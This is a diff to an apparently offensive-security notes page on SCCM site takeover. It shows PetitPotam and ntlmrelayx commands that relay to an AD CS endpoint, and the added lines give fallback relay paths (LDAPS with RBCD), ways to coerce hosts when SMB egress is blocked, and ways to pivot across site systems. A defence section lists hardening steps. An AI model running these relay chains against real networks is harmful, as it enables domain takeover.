@@ -46,6 +46,8 @@ PetitPotam.py -u low -p Passw0rd! -d corp.local relay-host site-server
 ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
 
+The web-enrollment endpoint `/certsrv/certfnsh.asp` only accepts NTLM auth when the IIS site has Windows Authentication and the CA exposes the legacy Web Enrollment role — if that role is disabled, pivot to the `/certsrv/` ADCS HTTP/RPC endpoint or relay to LDAPS with `--delegate-access` to write an msDS-AllowedToActOnBehalfOfOtherIdentity entry for RBCD against the site server instead. PetitPotam's MS-EFSRPC trigger fires over named pipes, so a host with SMB egress blocked but inbound 445 open is still coercible; force the WebClient service first if HTTP-only egress is your relay path. For SCCM specifically, the site server's machine account often holds local admin on every site system, so a single cert + S4U2Self → CIFS ticket frequently fans out to the management point, distribution point, and SMS provider in one chain.
+
 ## Detection and defence
 - Defender for Identity surfaces NTLM relay, AD CS abuse, coercion patterns
 - SCCM hardening: enable PKI for client comms, disable NTLM fallback, use a dedicated NAA with minimal rights, enable Enhanced HTTP, store collection vars as secret type
@@ -57,4 +59,5 @@ ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs -
 - [Misconfiguration-Manager](https://github.com/subat0mik/Misconfiguration-Manager) — canonical attack taxonomy
 - [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) — offensive toolkit by Chris Thompson
 - [SpecterOps blog](https://posts.specterops.io/) — SCCM site takeover write-ups
+- [ired.team — ADCS + PetitPotam NTLM relay](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate) — relay chain to machine cert, reusable against SCCM site servers
 - [[ad-recon-low-noise]] [[opsec-fundamentals]]
